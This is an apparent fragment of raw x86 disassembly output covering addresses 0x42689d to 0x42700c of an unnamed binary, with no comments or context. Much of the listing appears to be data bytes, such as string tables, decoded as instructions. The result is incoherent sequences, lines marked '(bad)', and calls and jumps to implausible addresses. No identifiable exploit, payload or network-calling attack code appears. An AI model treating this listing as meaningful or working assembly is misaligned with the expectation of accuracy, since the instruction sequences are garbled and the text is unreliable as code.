  42689d:	arpl   WORD PTR gs:[esi+edx*2+0x69],si
  4268a2:	jae    0x42690d
  4268a4:	bound  ebp,QWORD PTR [ebp+eiz*2+0x0]
  4268a8:	cli    
  4268a9:	add    DWORD PTR [ebx+0x65],edx
  4268ac:	je     0x426902
  4268ae:	gs js  0x426925
  4268b1:	inc    ebx
  4268b2:	outs   dx,DWORD PTR ds:[esi]
  4268b3:	ins    BYTE PTR es:[edi],dx
  4268b4:	outs   dx,DWORD PTR ds:[esi]
  4268b5:	jb     0x4268b7
  4268b7:	add    BYTE PTR [eax+0x1],al
  4268ba:	inc    edi
  4268bb:	gs je  0x426902
  4268be:	dec    ecx
  4268bf:	inc    edx
  4268c0:	imul   esi,DWORD PTR [ebx+esi*2+0x0],0x74530205
  4268c8:	popa   
  4268c9:	jb     0x42693f
  4268cb:	push   eax
  4268cc:	popa   
  4268cd:	add    BYTE PTR gs:[bp+si+0x4300],dl
  4268d3:	jb     0x42693a
  4268d5:	popa   
  4268d6:	je     0x42693d
  4268d8:	inc    esp
  4268d9:	dec    ecx
  4268da:	inc    edx
  4268db:	push   ebx
  4268dc:	arpl   WORD PTR gs:[ecx+ebp*2+0x6f],si
  4268e1:	outs   dx,BYTE PTR ds:[esi]
  4268e2:	add    BYTE PTR [eax],al
  4268e4:	rol    BYTE PTR [eax],0x45
  4268e7:	outs   dx,BYTE PTR ds:[esi]
  4268e8:	fs push eax
  4268ea:	popa   
  4268eb:	je     0x426955
  4268ed:	add    BYTE PTR [eax+0x65724300],cl
  4268f3:	popa   
  4268f4:	je     0x42695b
  4268f6:	inc    edx
  4268f7:	imul   esi,DWORD PTR [ebp+ebp*2+0x61],0x646e4970
  4268ff:	imul   esi,DWORD PTR [edx+0x65],0x7463
  426906:	test   BYTE PTR [ecx],al
  426908:	inc    edi
  426909:	gs je  0x426960
  42690c:	gs js  0x426983
  42690f:	inc    ebp
  426910:	js     0x426986
  426912:	outs   dx,BYTE PTR gs:[esi]
  426914:	je     0x426966
  426916:	outs   dx,DWORD PTR ds:[esi]
  426917:	imul   ebp,DWORD PTR [esi+0x74],0x573233
  42691e:	mov    ebx,0x63655201
  426923:	je     0x426986
  426925:	outs   dx,BYTE PTR ds:[esi]
  426926:	ins    BYTE PTR es:[di],dx
  426928:	add    BYTE PTR gs:[ebp+0x74615001],ah
  42692f:	push   0x65526f54
  426934:	imul   ebp,DWORD PTR [bx+0x6e],0x1690000
  42693c:	inc    edi
  42693d:	gs je  0x42698f
  426940:	bound  ebp,QWORD PTR [edx+0x65]
  426943:	arpl   WORD PTR [edi+edx*2+0x0],si
  426947:	add    BYTE PTR [edi+0x44],al
  42694a:	dec    ecx
  42694b:	xor    esi,DWORD PTR [edx]
  42694d:	cs fs ins BYTE PTR es:[edi],dx
  426950:	ins    BYTE PTR es:[edi],dx
  426951:	add    BYTE PTR [ebx+0x68],ch
  426954:	pop    edx
  426955:	jp     0x4269c9
  426957:	jp     0x4269cd
  426959:	push   ebx
  42695a:	and    ch,BYTE PTR [ebp+0x42]
  42695d:	add    BYTE PTR [edx],ch
  42695f:	ins    DWORD PTR es:[edi],dx
  426960:	inc    edx
  426961:	add    BYTE PTR [edx-0x10ffbd95],ah
  426967:	or     esi,DWORD PTR [edx+0x324f7d0e]
  42696d:	dec    edi
  42696e:	addr16 dec edi
  426970:	xor    DWORD PTR [edi+0x4f],ecx
  426973:	dec    edi
  426974:	cmp    al,0x4f
  426976:	jp     0x4269c7
  426978:	cmp    ecx,DWORD PTR [edi+0x5e]
  42697b:	dec    edi
  42697c:	es dec edi
  42697e:	jae    0x4269cf
  426980:	and    eax,0x224f324f
  426985:	dec    edi
  426986:	push   ds
  426987:	push   edx
  426988:	pop    ds
  426989:	push   ebx
  42698a:	cmp    eax,0x324f7d4f
  42698f:	dec    edi
  426990:	addr16 dec edi
  426992:	xor    DWORD PTR [edi+0x4f],ecx
  426995:	dec    edi
  426996:	cmp    al,0x4f
  426998:	jp     0x4269e9
  42699a:	cmp    ecx,DWORD PTR [edi+0x5e]
  42699d:	dec    edi
  42699e:	es dec edi
  4269a0:	ins    DWORD PTR es:[edi],dx
  4269a1:	dec    edi
  4269a2:	and    eax,0x224f324f
  4269a7:	dec    edi
  4269a8:	push   ds
  4269a9:	bound  ebx,QWORD PTR [edi]
  4269ab:	arpl   WORD PTR ds:0x324f7d4f,di
  4269b1:	dec    edi
  4269b2:	bound  ecx,QWORD PTR [edi+0x31]
  4269b5:	dec    edi
  4269b6:	jae    0x426a07
  4269b8:	cmp    eax,0x384f404f
  4269bd:	dec    edi
  4269be:	xor    cl,BYTE PTR [edi+0x24]
  4269c1:	dec    edi
  4269c2:	push   ds
  4269c3:	jb     0x4269e4
  4269c5:	jae    0x4269d6
  4269c7:	or     DWORD PTR [eax+eax*4],0x7c
  4269cb:	nop
  4269cc:	jge    0x42695f
  4269ce:	aas    
  4269cf:	dec    edi
  4269d0:	dec    di
  4269d2:	xor    cl,BYTE PTR [edi+0x66]
  4269d5:	dec    edi
  4269d6:	ds dec edi
  4269d8:	inc    eax
  4269d9:	dec    edi
  4269da:	cmp    eax,0x394f734f
  4269df:	dec    edi
  4269e0:	xor    cl,BYTE PTR [edi+0x26]
  4269e3:	dec    edi
  4269e4:	push   ds
  4269e5:	sbb    BYTE PTR [edi],0x83
  4269e8:	setae  BYTE PTR [eax+edx*4]
  4269ec:	jl     0x42698e
  4269ee:	jge    0x426991
  4269f0:	aas    
  4269f1:	dec    edi
  4269f2:	dec    di
  4269f4:	xor    cl,BYTE PTR [edi+0x66]
  4269f7:	dec    edi
  4269f8:	ds dec edi
  4269fa:	inc    eax
  4269fb:	dec    edi
  4269fc:	cmp    eax,0x394f6d4f
  426a01:	dec    edi
  426a02:	xor    cl,BYTE PTR [edi+0x26]
  426a05:	dec    edi
  426a06:	push   ds
  426a07:	xchg   edx,eax
  426a08:	pop    ds
  426a09:	xchg   ebx,eax
  426a0a:	bt     DWORD PTR [eax+eiz*4],ecx
  426a0e:	jl     0x4269c0
  426a10:	jge    0x4269c3
  426a12:	aas    
  426a13:	dec    edi
  426a14:	ins    BYTE PTR es:[edi],dx
  426a15:	dec    edi
  426a16:	xor    cl,BYTE PTR [edi+0x4e]
  426a19:	dec    edi
  426a1a:	xor    DWORD PTR [edi+0x73],ecx
  426a1d:	dec    edi
  426a1e:	cmp    eax,0x384f454f
  426a23:	dec    edi
  426a24:	xor    cl,BYTE PTR [edi+0x26]
  426a27:	dec    edi
  426a28:	push   ds
  426a29:	mov    ds:0xb30fa31f,al
  426a2e:	or     al,0xb0
  426a30:	jl     0x4269f2
  426a32:	jge    0x4269f5
  426a34:	aas    
  426a35:	dec    edi
  426a36:	ins    BYTE PTR es:[edi],dx
  426a37:	dec    edi
  426a38:	xor    cl,BYTE PTR [edi+0x4e]
  426a3b:	dec    edi
  426a3c:	xor    DWORD PTR [edi+0x7c],ecx
  426a3f:	dec    edi
  426a40:	cmp    eax,0x3b4f5f4f
  426a45:	dec    edi
  426a46:	xor    cl,BYTE PTR [edi+0x39]
  426a49:	dec    edi
  426a4a:	push   ds
  426a4b:	mov    dl,0x1f
  426a4d:	mov    bl,0xf
  426a4f:	ret    
  426a50:	or     al,0xc0
  426a52:	jl     0x426a24
  426a54:	jge    0x426a27
  426a56:	aas    
  426a57:	dec    edi
  426a58:	ins    BYTE PTR es:[edi],dx
  426a59:	dec    edi
  426a5a:	xor    cl,BYTE PTR [edi+0x4e]
  426a5d:	dec    edi
  426a5e:	xor    DWORD PTR [edi+0x62],ecx
  426a61:	dec    edi
  426a62:	cmp    eax,0x384f4e4f
  426a67:	dec    edi
  426a68:	xor    cl,BYTE PTR [edi+0x24]
  426a6b:	dec    edi
  426a6c:	push   ds
  426a6d:	ret    0xc31f
  426a70:	psrlq  mm1,QWORD PTR [eax+edx*8]
  426a74:	jl     0x426a56
  426a76:	jge    0x426a59
  426a78:	aas    
  426a79:	dec    edi
  426a7a:	ins    BYTE PTR es:[edi],dx
  426a7b:	dec    edi
  426a7c:	xor    cl,BYTE PTR [edi+0x4e]
  426a7f:	dec    edi
  426a80:	xor    DWORD PTR [edi+0x63],ecx
  426a83:	dec    edi
  426a84:	cmp    eax,0x384f404f
  426a89:	dec    edi
  426a8a:	xor    cl,BYTE PTR [edi+0x26]
  426a8d:	dec    edi
  426a8e:	push   ds
  426a8f:	rcr    BYTE PTR [edi],cl
  426a91:	ror    DWORD PTR [edi],cl
  426a93:	jecxz  0x426aa1
  426a95:	loopne 0x426b13
  426a97:	lock jge 0x426a8b
  426a9a:	aas    
  426a9b:	dec    edi
  426a9c:	popa   
  426a9d:	dec    edi
  426a9e:	xor    cl,BYTE PTR [edi+0x5f]
  426aa1:	dec    edi
  426aa2:	xor    DWORD PTR [edi+0x42],ecx
  426aa5:	dec    edi
  426aa6:	ds dec edi
  426aa8:	xor    cl,BYTE PTR [edi+0x3f]
  426aab:	dec    edi
  426aac:	push   ds
  426aad:	loop   0x426ace
  426aaf:	jecxz  0x426ac0
  426ab1:	repz or al,0xf0
  426ab4:	jl     0x426ab6
  426ab6:	jge    0x426ab9
  426ab8:	jl     0x426aca
  426aba:	jge    0x426acd
  426abc:	ds dec edi
  426abe:	jg     0x426b0f
  426ac0:	xor    cl,BYTE PTR [edi+0x5b]
  426ac3:	dec    edi
  426ac4:	xor    BYTE PTR [edi+0x62],cl
  426ac7:	dec    edi
  426ac8:	ds dec edi
  426aca:	inc    ecx
  426acb:	dec    edi
  426acc:	cmp    ecx,DWORD PTR [edi+0x32]
  426acf:	dec    edi
  426ad0:	cmp    DWORD PTR [edi+0x1e],ecx
  426ad3:	add    bl,BYTE PTR [edi]
  426ad5:	add    ecx,DWORD PTR [edi]
  426ad7:	adc    ecx,DWORD PTR [eax+edx*1]
  426ada:	jl     0x426afc
  426adc:	jge    0x426aff
  426ade:	aas    
  426adf:	dec    edi
  426ae0:	add    BYTE PTR [eax],al
  426ae2:	push   0x69
  426ae4:	inc    edx
  426ae5:	add    BYTE PTR [esi+0x6b],bl
  426ae8:	inc    edx
  426ae9:	add    BYTE PTR [esi+0x6b],ah
  426aec:	inc    edx
  426aed:	add    BYTE PTR [esi],ch
  426aef:	ins    DWORD PTR es:[edi],dx
  426af0:	inc    edx
  426af1:	add    BYTE PTR [edx+0x1e00426c],dl
  426af7:	ins    DWORD PTR es:[edi],dx
  426af8:	inc    edx
  426af9:	add    BYTE PTR [esi+0x6b],al
  426afc:	inc    edx
  426afd:	add    BYTE PTR [edx+0x6b],cl
  426b00:	inc    edx
  426b01:	add    BYTE PTR [esi],dl
  426b03:	ins    DWORD PTR es:[edi],dx
  426b04:	inc    edx
  426b05:	add    BYTE PTR [esi-0x4effbd95],ch
  426b0b:	test   eax,0xbab8f89c
  426b10:	pushf  
  426b11:	clc    
  426b12:	bound  ebp,QWORD PTR [ebx+0x42]
  426b15:	add    BYTE PTR [esi+0x6c],cl
  426b18:	inc    edx
  426b19:	add    BYTE PTR [edx+0x6c],ah
  426b1c:	inc    edx
  426b1d:	add    BYTE PTR [esi+0x6c],ch
  426b20:	inc    edx
  426b21:	add    BYTE PTR [esi+0x6c],bh
  426b24:	inc    edx
  426b25:	add    BYTE PTR [edx+0x6600426b],bl
  426b2b:	imul   eax,DWORD PTR [edx+0x0],0x426bba
  426b32:	stos   BYTE PTR es:[edi],al
  426b33:	imul   eax,DWORD PTR [edx+0x0],0x32
  426b37:	ins    DWORD PTR es:[edi],dx
  426b38:	inc    edx
  426b39:	add    BYTE PTR [eax],bh
  426b3b:	test   DWORD PTR [eax+edi*8-0x7ee8f463],ebx
  426b42:	outs   dx,BYTE PTR ds:[esi]
  426b43:	imul   eax,DWORD PTR [edx+0x0],0xffffff9a
  426b47:	sbb    al,0x16
  426b49:	or     DWORD PTR [esi+0x7050d],0x3a004000
  426b53:	call   0xa3184a93
  426b58:	inc    edx
  426b59:	add    BYTE PTR [ebx+0x65],al
  426b5c:	addr16 inc esp
  426b5e:	mov    ?,edx
  426b60:	jne    0x426bc4
  426b62:	mov    gs,ebp
  426b64:	inc    BYTE PTR [edi]
  426b66:	mov    edi,0x5605a3fa
  426b6b:	imul   eax,DWORD PTR [edx+0x0],0x39
  426b6f:	xchg   ebp,eax
  426b70:	pushf  
  426b71:	clc    
  426b72:	cmp    DWORD PTR [esi-0x6ac50764],edx
  426b78:	pushf  
  426b79:	clc    
  426b7a:	cmp    edx,DWORD PTR [ebp-0x6ac30764]
  426b80:	pushf  
  426b81:	clc    
  426b82:	cmp    eax,0x3ef89c95
  426b87:	xchg   ebp,eax
  426b88:	pushf  
  426b89:	clc    
  426b8a:	aas    
  426b8b:	xchg   ebp,eax
  426b8c:	pushf  
  426b8d:	clc    
  426b8e:	and    BYTE PTR [ebp-0x6ade0764],dl
  426b94:	pushf  
  426b95:	clc    
  426b96:	sub    BYTE PTR [ebp-0x6130764],dl
  426b9c:	add    esp,DWORD PTR [eax+0x5e]
  426b9f:	imul   eax,DWORD PTR [edx+0x0],0x426daa
  426ba6:	push   edi
  426ba7:	dec    edx
  426ba8:	ins    BYTE PTR es:[edi],dx
  426ba9:	popa   
  426baa:	cmp    BYTE PTR [ebp-0x16620764],al
  426bb0:	push   eax
  426bb1:	pop    es
  426bb2:	lds    eax,FWORD PTR [esi]
  426bb4:	add    BYTE PTR [eax],al
  426bb6:	pop    edx
  426bb7:	imul   eax,DWORD PTR [edx+0x0],0xe040b9b
	...
  426bee:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  426bef:	xor    eax,0x7dce0042
  426bf4:	inc    edx
  426bf5:	add    BYTE PTR [eax],al
  426bf7:	add    BYTE PTR [eax],al
  426bf9:	add    BYTE PTR [eax+eax*1+0x4a],al
  426bfd:	add    BYTE PTR [ebx+0x0],cl
  426c00:	push   ebp
  426c01:	add    BYTE PTR [ebx+0x0],ch
  426c04:	ins    BYTE PTR es:[edi],dx
  426c05:	add    BYTE PTR [edx+0x0],ch
  426c08:	inc    esp
  426c09:	add    BYTE PTR [edx+0x0],cl
  426c0c:	dec    ebx
  426c0d:	add    BYTE PTR [eax+eax*1+0x4b],cl
  426c11:	add    BYTE PTR [edx+0x0],cl
  426c14:	inc    esp
  426c15:	add    BYTE PTR [ebp+0x0],dl
  426c18:	dec    ecx
  426c19:	add    BYTE PTR [eax+eax*1+0x4c],al
  426c1d:	add    BYTE PTR [eax+eax*1+0x4a],cl
  426c21:	add    BYTE PTR [ebx+0x0],cl
  426c24:	inc    esp
  426c25:	add    BYTE PTR [ecx+0x0],cl
  426c28:	push   ebp
  426c29:	add    BYTE PTR [eax+eax*1+0x49],al
  426c2d:	add    BYTE PTR [edi+0x0],cl
  426c30:	ins    BYTE PTR es:[edi],dx
  426c31:	add    BYTE PTR [edx+0x0],ch
  426c34:	imul   eax,DWORD PTR [eax],0x64
  426c37:	add    BYTE PTR [eax],al
  426c39:	add    dl,bh
  426c3b:	imul   eax,DWORD PTR [edx+0x0],0xffffff8e
  426c3f:	cli    
  426c40:	jne    0x426cb3
	...
  426c4a:	xor    eax,0x5900423a
  426c4f:	dec    edi
  426c50:	pop    edi
  426c51:	dec    edi
  426c52:	inc    eax
  426c53:	dec    edi
  426c54:	inc    esp
  426c55:	dec    edi
  426c56:	pop    edi
  426c57:	dec    edi
  426c58:	inc    esi
  426c59:	dec    edi
  426c5a:	add    DWORD PTR [edi+0x0],ecx
  426c5d:	dec    edi
  426c5e:	xor    cl,BYTE PTR [edi+0x0]
  426c61:	add    BYTE PTR [ebp+0x4f],bl
  426c64:	pop    esi
  426c65:	dec    edi
  426c66:	pop    ebx
  426c67:	dec    edi
  426c68:	add    DWORD PTR [edi+0x0],ecx
  426c6b:	dec    edi
  426c6c:	xor    cl,BYTE PTR [edi+0x4f]
  426c6f:	dec    edi
  426c70:	inc    ecx
  426c71:	dec    edi
  426c72:	pop    edi
  426c73:	dec    edi
  426c74:	inc    eax
  426c75:	dec    edi
  426c76:	add    DWORD PTR [edi+0x0],ecx
  426c79:	dec    edi
  426c7a:	xor    cl,BYTE PTR [edi+0x0]
  426c7d:	add    BYTE PTR [ecx+0x4f],al
  426c80:	pop    edx
  426c81:	dec    edi
  426c82:	inc    esi
  426c83:	dec    edi
  426c84:	dec    ebp
  426c85:	dec    edi
  426c86:	push   ebx
  426c87:	dec    edi
  426c88:	inc    edx
  426c89:	dec    edi
  426c8a:	pop    ebx
  426c8b:	dec    edi
  426c8c:	xor    cl,BYTE PTR [edi+0x0]
  426c8f:	add    BYTE PTR [eax],al
  426c91:	add    BYTE PTR [esi+0x7d],ch
  426c94:	outs   dx,BYTE PTR ds:[esi]
  426c95:	lea    ebp,[esi-0x63]
  426c98:	outs   dx,BYTE PTR ds:[esi]
  426c99:	lods   eax,DWORD PTR ds:[esi]
  426c9a:	outs   dx,BYTE PTR ds:[esi]
  426c9b:	mov    ebp,0xdd6ecd6e
  426ca0:	outs   dx,BYTE PTR ds:[esi]
  426ca1:	in     eax,dx
  426ca2:	outs   dx,BYTE PTR ds:[esi]
  426ca3:	std    
  426ca4:	outs   dx,BYTE PTR ds:[esi]
  426ca5:	or     eax,0x2d6e1d6e
  426caa:	outs   dx,BYTE PTR ds:[esi]
  426cab:	cmp    eax,0x6d6e5d6e
  426cb0:	outs   dx,BYTE PTR ds:[esi]
  426cb1:	jb     0x426d21
  426cb3:	jae    0x426d23
  426cb5:	jo     0x426d25
  426cb7:	jno    0x426d27
  426cb9:	jbe    0x426d29
  426cbb:	ja     0x426d2b
  426cbd:	je     0x426d2d
  426cbf:	jne    0x426d2f
  426cc1:	mov    ch,BYTE PTR [esi-0x75]
  426cc4:	outs   dx,BYTE PTR ds:[esi]
  426cc5:	mov    BYTE PTR [esi-0x77],ch
  426cc8:	outs   dx,BYTE PTR ds:[esi]
  426cc9:	mov    gs,WORD PTR [esi+0x7c]
  426ccc:	pop    esi
  426ccd:	jge    0x426d1d
  426ccf:	jge    0x426c8f
  426cd1:	jge    0x426d2f
  426cd3:	(bad)  
  426cd4:	jge    0x426d46
  426cd6:	mov    ebp,0x71736eb1
  426cdb:	bound  ebp,QWORD PTR [edx+0x70265fc6]
  426ce1:	add    BYTE PTR [ebp+0x17],cl
  426ce4:	mov    ebx,0x4af4bd56
  426ce9:	aaa    
  426cea:	dec    edx
  426ceb:	jle    0x426c8a
  426ced:	jno    0x426d43
  426cef:	mov    cl,0x8
  426cf1:	imul   ebp,DWORD PTR [eax+ecx*1+0x58fd7d8],0x48
  426cf9:	xlat   BYTE PTR ds:[ebx]
  426cfa:	lds    edx,FWORD PTR [ebx+0x7dc4114c]
  426d00:	ret    
  426d01:	fidiv  WORD PTR [edi]
  426d03:	into   
  426d04:	mul    BYTE PTR [esi+0x1faa3204]
  426d0a:	push   0xc5c644f1
  426d0f:	sbb    ch,al
  426d11:	jno    0x426d13
  426d13:	add    BYTE PTR [eax],al
  426d15:	add    dh,ch
  426d17:	(bad)  [ebx+0x7]
  426d1a:	mov    dh,0x6b
  426d1c:	inc    edx
  426d1d:	add    BYTE PTR [edi+ebx*1],dh
  426d20:	mov    al,0x22
  426d22:	int3   
  426d23:	push   ecx
  426d24:	inc    edx
  426d25:	add    BYTE PTR [ecx+0x6b],bh
  426d28:	dec    edx
  426d29:	jae    0x426d79
  426d2b:	imul   eax,DWORD PTR [edx+0x0],0xffffffb2
  426d2f:	imul   eax,DWORD PTR [edx+0x0],0xffffff8e
  426d33:	in     eax,dx
  426d34:	adc    al,BYTE PTR [edi]
	...
  426d56:	addr16 push ebx
  426d58:	push   ecx
  426d59:	pop    eax
  426d5a:	jb     0x426dd6
  426d5c:	inc    esp
  426d5d:	inc    ecx
  426d5e:	dec    edx
  426d5f:	imul   esi,DWORD PTR [ecx+0x56],0x54695055
  426d66:	dec    esi
  426d67:	inc    edx
  426d68:	dec    esi
  426d69:	imul   eax,DWORD PTR [eax],0x0
	...
  426d7c:	add    BYTE PTR [eax],al
  426d7e:	push   0x73
  426d80:	dec    eax
  426d81:	inc    edx
  426d82:	outs   dx,BYTE PTR ds:[esi]
  426d83:	jno    0x426dff
  426d85:	inc    ecx
  426d86:	dec    ebx
  426d87:	jno    0x426e02
  426d89:	imul   ecx,DWORD PTR [edx+0x73],0x7a
  426d8d:	je     0x426dde
  426d8f:	jo     0x426de8
  426d91:	dec    edx
  426d92:	ins    BYTE PTR es:[edi],dx
  426d93:	popa   
  426d94:	inc    ecx
  426d95:	inc    ebx
  426d96:	ja     0x426dde
  426d98:	inc    ebx
  426d99:	add    BYTE PTR gs:[eax],al
  426d9c:	push   eax
  426d9d:	push   esi
  426d9e:	dec    ebp
  426d9f:	popa   
  426da0:	pop    eax
  426da1:	addr16 dec edi
  426da3:	popa   
  426da4:	outs   dx,BYTE PTR ds:[esi]
  426da5:	pop    edx
  426da6:	ins    BYTE PTR es:[edi],dx
  426da7:	inc    edi
  426da8:	add    BYTE PTR [eax],al
  426daa:	dec    ebp
  426dab:	push   ebp
  426dac:	mov    DWORD PTR [ebx-0x7e9f13f8],ecx
  426db2:	mov    esp,ebp
  426db4:	or     al,ah
  426db6:	dec    ebp
  426db7:	add    bh,al
  426db9:	add    BYTE PTR [eax],cl
  426dbb:	add    BYTE PTR [eax],al
  426dbd:	mov    DWORD PTR [eax],0x3ef44545
  426dc3:	cmp    BYTE PTR [eax],al
  426dc5:	test   DWORD PTR [ebx-0x34070b64],ecx
  426dcb:	(bad)  
  426dcc:	enter  0x4d45,0xb8
  426dd0:	mov    edi,DWORD PTR [ecx]
  426dd2:	hlt    
  426dd3:	test   ebx,ecx
  426dd5:	pushf  
  426dd6:	enter  0x4df8,0x8b
  426dda:	mov    DWORD PTR [ebp+0x8],0x894708
  426de1:	inc    ebp
  426de2:	mov    ebp,0xff8bfffc
  426de7:	dec    ebp
  426de8:	mov    ch,0xf4
  426dea:	call   DWORD PTR [ebx-0x1]
  426ded:	mov    ebx,0x8005022
  426df2:	call   DWORD PTR [ecx+0x8]
  426df5:	pop    es
  426df6:	jmp    0xb8:0x9cb4533
  426dfd:	cwde   
  426dfe:	mov    esi,DWORD PTR [edx-0xc]
  426e01:	xor    al,bl
  426e03:	add    BYTE PTR [eax+0x3c83203],bl
  426e09:	mov    DWORD PTR [ecx+0x45c4084d],ecx
  426e0f:	mov    eax,DWORD PTR [ebx-0xb87b3]
  426e15:	xor    eax,DWORD PTR [eax]
  426e17:	retf   
  426e18:	ret    
  426e19:	add    eax,esi
  426e1b:	enter  0x8945,0x64
  426e1f:	dec    ebp
  426e20:	sbb    ah,cl
  426e22:	add    BYTE PTR [ebx-0xb87b277],cl
  426e28:	dec    DWORD PTR [ebx-0xbcfb275]
  426e2e:	test   DWORD PTR [ebx],esi
  426e30:	dec    ebx
  426e32:	inc    DWORD PTR [ebx]
  426e34:	inc    eax
  426e35:	enter  0x8989,0x64
  426e39:	(bad)  
  426e3a:	jmp    FWORD PTR [ebx+ecx*4-0x1]
  426e3e:	cld    
  426e3f:	dec    DWORD PTR [ebp-0xa90001]
  426e45:	push   edi
  426e46:	mov    BYTE PTR [edx+0x1],ch
  426e49:	and    BYTE PTR [eax],al
  426e4b:	pop    ecx
  426e4c:	inc    ebp
  426e4d:	mov    DWORD PTR [ebp-0xb28ff8],ecx
  426e53:	push   0xffffff89
  426e55:	pop    ecx
  426e56:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  426e57:	dec    ebp
  426e58:	add    BYTE PTR [ecx+0x45fc088b],cl
  426e5e:	jne    0x426ea8
  426e60:	lea    eax,[eax]
  426e62:	fs (bad) 
  426e64:	dec    DWORD PTR [eax]
  426e66:	mov    DWORD PTR [eax],eax
  426e68:	test   al,0x0
  426e6a:	add    BYTE PTR [ebp-0x18],cl
  426e6d:	xor    ebp,DWORD PTR [edx]
  426e6f:	add    eax,DWORD PTR [eax]
  426e71:	mov    eax,eax
  426e73:	or     BYTE PTR [ebp+ecx*2+0x3003302],al
  426e7a:	inc    ebp
  426e7b:	mov    DWORD PTR [ebx+0x459408],ecx
  426e81:	popa   
  426e82:	mov    esp,DWORD PTR [ebp-0x75]
  426e85:	(bad)  
  426e86:	cld    
  426e87:	inc    eax
  426e88:	cmp    bh,0x1
  426e8b:	lea    eax,[eax]
  426e8d:	and    BYTE PTR [eax],al
  426e8f:	inc    DWORD PTR [ecx-0x18]
  426e92:	mov    ecx,DWORD PTR [ebx]
  426e94:	cld    
  426e95:	add    BYTE PTR [ecx+0x75014d],cl
  426e9b:	(bad)  
  426e9c:	xchg   ebp,eax
  426e9d:	sar    bh,1
  426e9f:	inc    eax
  426ea0:	inc    DWORD PTR [eax]
  426ea2:	mov    eax,DWORD PTR [ebp-0x4]
  426ea5:	xor    edx,DWORD PTR [edx+0x7201be]
  426eab:	add    BYTE PTR [edx],dl
  426ead:	(bad)  
  426eae:	nop
  426eaf:	inc    ebp
  426eb0:	add    BYTE PTR [ebx-0x5afb0c00],cl
  426eb6:	mov    al,0xff
  426eb8:	add    bh,bh
  426eba:	add    BYTE PTR [ebx],dh
  426ebc:	inc    DWORD PTR [ebx]
  426ebe:	sbb    al,0x89
  426ec0:	jne    0x426e9e
  426ec2:	mov    esp,DWORD PTR [ecx+0x4500fc]
  426ec8:	mov    eax,DWORD PTR [ebp-0xff0048]
  426ece:	mov    DWORD PTR [eax-0x70],0xee70ed89
  426ed5:	inc    DWORD PTR [ebp-0x75]
  426ed8:	fisttp QWORD PTR [eax+ebp*8]
  426edb:	test   DWORD PTR [esi-0x1],esp
  426ede:	inc    ebp
  426edf:	(bad)  
  426ee0:	aas    
  426ee1:	inc    ebp
  426ee2:	(bad)  
  426ee3:	lea    edi,[eax+edi*2-0x1]
  426ee7:	inc    edi
  426ee9:	mov    DWORD PTR ds:0x8000c7a0,edi
  426eef:	mov    ebp,esi
  426ef1:	cld    
  426ef2:	in     al,0x8d
  426ef4:	inc    ebp
  426ef5:	(bad)  
  426ef6:	call   0xc7cb4efa
  426efb:	add    DWORD PTR [eax-0x11ba1500],ecx
  426f01:	inc    DWORD PTR [ebp-0x4]
  426f04:	out    0x8d,eax
  426f06:	aas    
  426f07:	(bad)  
  426f08:	call   0xca9a0c
  426f0d:	add    DWORD PTR [ebx-0x7f570400],ecx
  426f13:	add    BYTE PTR [ecx],al
  426f15:	test   DWORD PTR [eax],eax
  426f17:	wrmsr  
  426f19:	jae    0x426f08
  426f1b:	add    BYTE PTR [eax],al
  426f1d:	mov    eax,DWORD PTR [ebp-0x747f8a04]
  426f23:	add    esp,edi
  426f25:	add    BYTE PTR [eax+0x450108],al
  426f2b:	mov    edi,DWORD PTR [ebp-0x6c]
  426f2e:	add    DWORD PTR [eax],0x4
  426f31:	mov    eax,DWORD PTR [ebp+0x3]
  426f34:	mov    edi,DWORD PTR [esp+edi*8]
  426f37:	dec    ebp
  426f38:	nop
  426f39:	mov    eax,DWORD PTR [ecx]
  426f3b:	fadd   DWORD PTR [eax]
  426f3d:	add    BYTE PTR [esi],al
  426f3f:	lea    eax,[eax]
  426f41:	pusha  
  426f42:	push   eax
  426f43:	inc    DWORD PTR [ebp+0x52]
  426f46:	call   DWORD PTR [ebp-0x7b]
  426f49:	mov    esi,DWORD PTR [ebp-0x74]
  426f4c:	mov    eax,DWORD PTR [eax]
  426f4e:	cld    
  426f4f:	mov    eax,DWORD PTR [eax+0x880103]
  426f55:	add    BYTE PTR [ebp+0x6a],bh
  426f58:	cmp    edi,0x10
  426f5b:	mov    WORD PTR [ebp+0x0],es
  426f5e:	mov    edx,DWORD PTR [edx-0x4]
  426f61:	push   ecx
  426f62:	nop
  426f63:	inc    DWORD PTR [ecx]
  426f65:	cld    
  426f66:	add    BYTE PTR [ebp-0x24],bh
  426f69:	mov    eax,DWORD PTR [eax]
  426f6b:	cld    
  426f6c:	push   eax
  426f6d:	nop
  426f6e:	inc    ebp
  426f6f:	add    edi,edi
  426f71:	add    BYTE PTR [ebx+0x4de4f445],cl
  426f77:	in     al,dx
  426f78:	xor    eax,edi
  426f7a:	add    edx,DWORD PTR [ebx+edi*1+0x36e70feb]
  426f81:	mov    DWORD PTR [eax],0xb8788b98
  426f87:	test   ebx,eax
  426f89:	jmp    FWORD PTR [eax-0x1]
  426f8c:	int    0xed
  426f8e:	sub    esp,eax
  426f90:	add    eax,DWORD PTR [ebp-0x30]
  426f93:	fild   WORD PTR [ebp+0x3f]
  426f96:	cmp    eax,edi
  426f98:	je     0xca434fba
  426f9e:	mov    DWORD PTR [ebp-0x28],0xe300f3
  426fa5:	(bad)  
  426fa6:	jne    0x426f34
  426fa8:	mov    ebx,ebp
  426faa:	cld    
  426fab:	js     0x426ff2
  426fad:	cmp    ecx,DWORD PTR [ebx+0x50b400]
  426fb3:	inc    ebp
  426fb4:	call   0xea9944
  426fb9:	add    BYTE PTR [ebx-0x7f170301],cl
  426fbf:	add    DWORD PTR es:[eax],eax
  426fc2:	add    al,al
  426fc4:	xor    BYTE PTR [eax+0x41],dl
  426fc7:	inc    ebp
  426fc8:	add    BYTE PTR [ebx+0xfcd88b],cl
  426fce:	mov    DWORD PTR [ebx-0x3fff03ff],ecx
  426fd4:	add    DWORD PTR [ecx+0x458be845],ecx
  426fda:	fmul   DWORD PTR [ebx+0x8bb800]
  426fe0:	cld    
  426fe1:	call   0xd79aa6
  426fe6:	dec    DWORD PTR [ebx+0x1090e8ff]
  426fec:	add    al,al
  426fee:	push   eax
  426fef:	es inc ebp
  426ff1:	inc    ebp
  426ff2:	mov    ecx,DWORD PTR [ebx+0xd89c]
  426ff8:	dec    DWORD PTR [ebx-0x3ff70301]
  426ffe:	mov    DWORD PTR gs:[eax],eax
  427001:	call   0x8b6ab5c6
  427006:	inc    ebp
  427007:	mov    eax,0xe8d8008b
  42700c:	add    BYTE PTR [ecx],ch
